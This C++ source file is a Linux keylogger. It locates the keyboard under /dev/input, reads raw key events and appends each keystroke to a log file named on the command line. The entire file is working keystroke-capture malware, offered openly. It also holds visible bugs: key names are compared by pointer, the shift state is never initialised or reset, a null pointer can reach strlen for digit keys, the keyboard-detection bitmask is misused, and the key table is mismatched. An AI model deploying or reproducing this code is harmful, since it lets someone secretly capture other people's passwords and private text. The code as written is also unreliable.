#include <cstdio>
#include <filesystem>
#include <vector>
#include <string>
#include <cstdlib>  
#include <fcntl.h>
#include <cstring>
#include <err.h>
#include <error.h>
#include <unistd.h>
#include <errno.h>
#include <iostream>
#include <cerrno>
#include <stdexcept>   // For standard exceptions
#include <system_error>
#include <fstream>
#include <linux/input.h> 
#include <sys/ioctl.h> 
#include <signal.h>    // Main header for signal handling
using namespace std;



std::vector keycodes = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "MINUS",
        "EQUAL",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "LEFTBRACE",
        "RIGHTBRACE",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "SEMICOLON",
        "APOSTROPHE",
        "GRAVE",
        "LEFTSHIFT",
        "BACKSLASH",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "SLASH",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK",
        "a", "b", "c", "d", "e", "f", "g",
        "h", "i", "j", "k", "l", "m", "n",
        "o", "p", "q", "r", "s", "t", "u",
        "v", "w", "x", "y", "z"
};

char* keycode_to_lower(int keycode) {
    switch(keycode) {
        case KEY_A: return "a";
        case KEY_B: return "b";
        case KEY_C: return "c";
        case KEY_D: return "d";
        case KEY_E: return "e";
        case KEY_F: return "f";
        case KEY_G: return "g";
        case KEY_H: return "h";
        case KEY_I: return "i";
        case KEY_J: return "j";
        case KEY_K: return "k";
        case KEY_L: return "l";
        case KEY_M: return "m";
        case KEY_N: return "n";
        case KEY_O: return "o";
        case KEY_P: return "p";
        case KEY_Q: return "q";
        case KEY_R: return "r";
        case KEY_S: return "s";
        case KEY_T: return "t";
        case KEY_U: return "u";
        case KEY_V: return "v";
        case KEY_W: return "w";
        case KEY_X: return "x";
        case KEY_Y: return "y";
        case KEY_Z: return "z";
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n";
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        default: return 0; // Not a character we care about
    }
}

int loop = 1;

void sigint_handler(int sig)
{
    loop = 0;
}

int write_all(int file_desc, const char *str)
{
    int bytesWritten = 0;
    int bytesToWrite = strlen(str);

    do
    {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if(bytesWritten == -1)
        {
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}

void safe_write_all(int file_desc, const char *str, int keyboard)
{
    struct sigaction new_actn, old_actn;
    new_actn.sa_handler = SIG_IGN;
    sigemptyset(&new_actn.sa_mask);
    new_actn.sa_flags = 0;

    sigaction(SIGPIPE, &new_actn, &old_actn);

    if(!write_all(file_desc, str))
    {
        close(file_desc);
        close(keyboard);
        std::cerr << "Error: " << strerror(errno) << std::endl;
        exit(1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}

void keylogger(int keyboard, int writeout)
{
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    const unsigned int number_of_events = 128;
    struct input_event events[number_of_events];
    int i;

    signal(SIGINT, sigint_handler);

    int shift_pressed;

    while(loop) {
        bytesRead = read(keyboard, events, eventSize * number_of_events);

        for(i = 0; i < (bytesRead / eventSize); ++i)
        {
            if(events[i].type == EV_KEY)
            {
                if(events[i].value == 1)
                {
                    if(events[i].code > 0 && events[i].code < keycodes.size())
                    {   
                        if (events[i].code == KEY_LEFTSHIFT || events[i].code == KEY_RIGHTSHIFT) {
                        shift_pressed = (events[i].value == 1); // 1 = pressed, 0 = released
                        continue;
                        }
                
                        if (keycodes[events[i].code] == "ENTER") {
                            
                            safe_write_all(writeout, "\n", keyboard);
                        } else if (keycodes[events[i].code] == "SPACE") {
                            safe_write_all(writeout, " ", keyboard);
                        } else if (keycodes[events[i].code] == "BACKSPACE") {
                            safe_write_all(writeout, " <- ", keyboard);
                        } else {
                            if (!shift_pressed) {
                                char* c = keycode_to_lower(events[i].code);
                                safe_write_all(writeout, c, keyboard);
                            } else {
                            safe_write_all(writeout, keycodes[events[i].code], keyboard);
                            }
                        }
                        //safe_write_all(writeout, "\n", keyboard);
                    }
                    else
                    {
                        write(writeout, "\nUNRECOGNIZED\n", sizeof("\nUNRECOGNIZED\n"));
                    }
                }
            }
        }
    }
    if(bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
}


string get_kb_device() {

    std::string kb_device = "";

    for (auto &p : std::filesystem::directory_iterator("/dev/input/"))
    {
        std::filesystem::file_status status = std::filesystem::status(p);

        if (std::filesystem::is_character_file(status))
        {
            std::string filename = p.path().string();
            int fd = open(filename.c_str(), O_RDONLY);
            if(fd == -1)
            {
                std::cerr << "Error: " << strerror(errno) << std::endl;
                continue;
            }

            int32_t event_bitmap = 0;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if((EV_KEY & event_bitmap) == EV_KEY)
            {
                // The device acts like a keyboard

                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if((kbd_bitmap & event_bitmap) == kbd_bitmap)
                {
                    // The device supports A, B, C, Z keys, so it probably is a keyboard
                    kb_device = filename;
                    close(fd);
                    break;
                }
            }
            close(fd);
        }
    }
    return kb_device;
}

int main(int argc, char *argv[]) {
    string kb_device = get_kb_device();


    int writeout;
    int keyboard;

    if((writeout = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0)
    {
        std::cerr << "Error opening file " << argv[1] << ": " << strerror(errno) << std::endl;
        return 1;
    }

    if((keyboard = open(kb_device.c_str(), O_RDONLY)) < 0)
    {
        std::cerr << "Error accessing keyboard from " << kb_device << ". May require you to be superuser." << std::endl;
        return 1;
    }

    std::cout << "Keyboard device: " << kb_device << std::endl;
    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);
    return 0;
}